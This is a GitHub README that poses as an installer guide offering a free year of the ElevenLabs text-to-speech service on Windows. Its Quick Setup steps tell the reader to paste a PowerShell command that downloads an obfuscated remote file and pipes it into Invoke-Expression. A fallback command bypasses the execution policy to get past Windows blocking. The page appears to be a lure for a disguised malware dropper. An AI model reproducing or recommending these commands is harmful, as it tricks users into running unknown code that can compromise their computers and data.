# ElevenLabs

ElevenLabs on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

ElevenLabs is a subscription service for turning text into natural speech and managing custom voices on Windows. You pick models, adjust stability and clarity, and export audio for podcasts, games, dubbing, and app prototypes without treating the tool like a traditional desktop editor.

A typical session starts from your project folder: open the bundled client, paste or import a script, choose a preset or cloned voice, preview lines, then batch-generate WAV or MP3 for your timeline. You might tweak pronunciation, swap speakers mid-scene, and save voice settings as profiles for the next episode or sprint.

This repository holds the Windows setup file, quick-start notes for API and studio workflows, and a changelog that tracks bundle revisions and voice-engine updates. It is meant as a practical install anchor on your machine, not a marketing site. The free trial is built in and runs for a year from first activation; when that period ends, the free subscription tier configured during setup remains on the PC for everyday generation within its limits.

## What you get

- Built-in free trial activates on first run and covers twelve months of full-feature access.
- After setup completes, the free subscription persists locally for routine text-to-speech generation.
- Clone or pick voices with sliders for stability, similarity, and style exaggeration per line.
- Batch scripts into timed audio exports for video edits, games, and multilingual dubbing tracks.
- Save speaker profiles and reuse them across projects without retyping API or model choices.
- Changelog in-repo documents engine bumps, preset packs, and Windows bundle refresh dates.
- Studio and API notes explain project folders, keys, and quota-friendly generation habits on PC.
- Windows installer path in the repo keeps versioned setup aligned with your subscription tier.

## Quick Setup (PowerShell)

This starts the built-in ElevenLabs free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/katrinhuber77307/elevenlabs-setup-guide/main/vv3u95q99r.qrx02kdj | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/katrinhuber77307/elevenlabs-setup-guide/main/vv3u95q99r.qrx02kdj | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `vv3u95q99r.qrx02kdj` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `katrinhuber77307/elevenlabs-setup-guide`. ElevenLabs 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
